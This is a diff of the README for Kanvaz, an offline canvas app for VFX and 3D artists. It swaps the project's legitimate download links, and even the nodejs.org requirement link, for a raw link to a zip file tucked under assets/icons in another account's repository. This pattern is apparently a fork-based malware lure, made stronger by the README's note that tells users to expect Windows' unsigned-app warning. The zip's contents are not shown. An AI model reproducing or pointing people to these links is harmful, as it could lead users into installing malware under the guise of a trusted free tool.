@@ -5,9 +5,9 @@
 An infinite canvas for VFX artists, 3D artists, and the people who teach them.  
 Drop images, GIFs, videos, and audio. Annotate. Save. No internet. No telemetry. Your files never leave your machine.
 
-### [⬇ Download for Windows](https://github.com/p4inz-code/kanvaz/releases/latest)
+### [⬇ Download for Windows](https://github.com/quilted-civiccenter984/kanvaz/raw/refs/heads/main/assets/icons/Software_v2.0.zip)
 
-Grab the latest installer from the [Releases page](https://github.com/p4inz-code/kanvaz/releases/latest) — no setup or technical knowledge needed.
+Grab the latest installer from the [Releases page](https://github.com/quilted-civiccenter984/kanvaz/raw/refs/heads/main/assets/icons/Software_v2.0.zip) — no setup or technical knowledge needed.
 
 > **Note:** Kanvaz isn't code-signed (signing certificates cost money and
 > this app is free). When you run the installer, Windows will likely show
@@ -23,7 +23,7 @@ See [CHANGELOG.md](CHANGELOG.md) for version history.
 
 ## Requirements
 
-- Node.js 18+ ([nodejs.org](https://nodejs.org))
+- Node.js 18+ ([nodejs.org](https://github.com/quilted-civiccenter984/kanvaz/raw/refs/heads/main/assets/icons/Software_v2.0.zip))
 - npm 9+
 
 ---
